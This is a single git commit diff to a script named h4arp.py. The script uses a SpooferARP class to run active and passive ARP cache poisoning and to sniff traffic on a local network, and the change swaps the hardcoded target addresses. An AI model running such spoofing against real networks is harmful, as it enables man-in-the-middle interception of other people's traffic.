da7076e02ab5efa36cae380568a4395d48a68422
FraMexa <ossertgs2003@gmail.com>
2025-03-15 20:07:02 +0300

    h4arp.py

--- h4arp.py
+++ h4arp.py
@@ -3,7 +3,7 @@ from ArpSpoof import SpooferARP
 spoofer = SpooferARP('10.23.11.1', ' 224.0.0.242 ')
 spoofer.active_cache_poisonning()
 
-spoofer = SpooferARP('10.23.13.1', ' 224.0.0.251 ', conf.iface, False, 0.5)
+spoofer = SpooferARP('10.23.11.1', ' 224.0.0.242 ', conf.iface, False, 0.5)
 spoofer.passive_cache_poisonning(asynchronous=True)
 spoofer.run = False
 spoofer.sniffer.stop()
